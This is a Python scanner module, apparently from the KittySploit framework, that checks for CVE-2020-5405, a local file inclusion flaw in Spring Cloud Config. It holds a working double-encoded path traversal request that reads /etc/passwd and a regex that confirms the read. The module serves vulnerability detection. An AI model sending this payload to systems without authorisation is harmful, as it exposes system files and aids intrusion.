#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Spring Cloud Config versions 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Spring Cloud Config - Local File Inclusion Detection',
        'description': 'Spring Cloud Config versions 2.2.x prior to 2.2.2, 2.1.x prior to 2.1.7, and older unsupported versions are vulnerable to local file inclusion because they allow applications to serve arbitrary configuration files through the spring-cloud-config-server module.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'lfi', 'springcloud', 'vmware', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://pivotal.io/security/cve-2020-5405',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-5405',
            'https://github.com/Secxt/FINAL',
            'https://github.com/pen4uin/vulnerability-research-list',
        ],
        'cve': 'CVE-2020-5405',
    }

    def run(self):
        r = self.http_request(method="GET", path='/a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Spring Cloud Config - Local File Inclusion detected",
                path='/a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd',
            )
            return True
        return False

